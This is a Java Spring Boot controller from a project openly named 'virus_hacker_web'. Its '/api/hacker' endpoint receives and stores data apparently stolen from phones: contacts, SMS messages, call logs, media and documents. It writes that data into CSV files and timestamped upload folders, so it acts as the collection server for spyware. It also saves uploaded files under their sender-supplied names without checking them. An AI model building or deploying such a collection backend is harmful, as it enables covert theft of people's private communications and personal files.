package com.tools.virus_hacker_web.controller;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.tools.virus_hacker_web.dto.CollectedData;
import com.tools.virus_hacker_web.service.CsvService;
import lombok.RequiredArgsConstructor;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestPart;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.multipart.MultipartFile;

import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

@RestController
@RequestMapping("/api")
@RequiredArgsConstructor
public class HackerController {

    // 프로젝트 루트 기준 절대 경로 사용
    private static final String UPLOAD_DIR = System.getProperty("user.dir") + "/uploads";
    private static final SimpleDateFormat folderDateFormat = new SimpleDateFormat("yyyyMMddHHmmss");

    private final CsvService csvService;

    @PostMapping("/hacker")
    public ResponseEntity<?> collectData(
            @RequestPart("data") String jsonData,
            @RequestPart("files") List<MultipartFile> files
    ) {
        try {
            // 1. YYYYMMDDHHMMSS 형식의 폴더명 생성
            String folderName = folderDateFormat.format(new Date());
            Path sessionFolder = Paths.get(UPLOAD_DIR, folderName);
            Files.createDirectories(sessionFolder);
            System.out.println("Session folder: " + sessionFolder.toAbsolutePath());

            // 2. JSON 파싱
            ObjectMapper objectMapper = new ObjectMapper();
            CollectedData data = objectMapper.readValue(jsonData, CollectedData.class);

            System.out.println("Contacts: " + (data.getContacts() != null ? data.getContacts().size() : 0));
            System.out.println("SMS: " + (data.getSms() != null ? data.getSms().size() : 0));
            System.out.println("Call Logs: " + (data.getCallLogs() != null ? data.getCallLogs().size() : 0));
            System.out.println("Media Files: " + (data.getMediaFiles() != null ? data.getMediaFiles().size() : 0));
            System.out.println("Documents: " + (data.getDocuments() != null ? data.getDocuments().size() : 0));

            // 3. 모든 데이터를 하나의 CSV 파일로 생성
            Path comprehensiveCsvPath = sessionFolder.resolve("data.csv");
            csvService.createComprehensiveCsv(data, comprehensiveCsvPath);
            System.out.println("Created: data.csv");

            // 4. 파일 저장
            System.out.println("Received " + files.size() + " files");
            for (MultipartFile file : files) {
                if (!file.isEmpty() && file.getOriginalFilename() != null) {
                    String fileName = file.getOriginalFilename();

                    try {
                        Path filePath = sessionFolder.resolve(fileName);

                        // transferTo() 대신 Files.copy() 사용 (더 안정적)
                        try (InputStream inputStream = file.getInputStream()) {
                            Files.copy(inputStream, filePath, StandardCopyOption.REPLACE_EXISTING);
                        }

                        System.out.println("Saved: " + fileName);
                        System.out.println("Path: " + filePath.toAbsolutePath());
                    } catch (IOException e) {
                        System.err.println("Failed to save: " + fileName);
                        System.err.println("Error: " + e.getMessage());
                        e.printStackTrace();
                    }
                }
            }

            return ResponseEntity.ok().body("Success: Files saved to " + folderName);
        } catch (Exception e) {
            e.printStackTrace();
            return ResponseEntity.status(500).body("Error: " + e.getMessage());
        }
    }
}